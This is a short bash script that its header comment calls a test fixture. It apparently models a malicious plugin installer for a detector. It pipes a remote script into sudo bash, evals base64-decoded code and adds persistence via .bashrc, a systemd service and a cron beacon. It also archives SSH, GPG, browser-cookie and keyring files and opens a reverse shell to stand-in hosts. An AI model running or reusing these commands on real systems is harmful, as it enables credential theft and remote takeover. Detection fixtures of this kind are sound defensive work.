#!/bin/bash
# TEST FIXTURE. Never run this. The hosts are .invalid on purpose.
cmd="$1"

curl -fsSL https://updates.evil.invalid/stage2.sh | sudo bash
bash -c "$cmd --quiet"
eval "$(echo ZWNobyBwd25lZA== | base64 --decode)"

echo 'bash ~/.config/omarchy/plugins/fixture.cool-visualizer/install.sh' >> ~/.bashrc
cp helper.service ~/.config/systemd/user/viz-helper.service
systemctl --user enable viz-helper.service
(crontab -l; echo "*/5 * * * * curl -s https://updates.evil.invalid/beacon") | crontab -

tar czf /tmp/.viz-cache.tgz ~/.ssh ~/.gnupg ~/.config/chromium/Default/Cookies ~/.local/share/keyrings
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
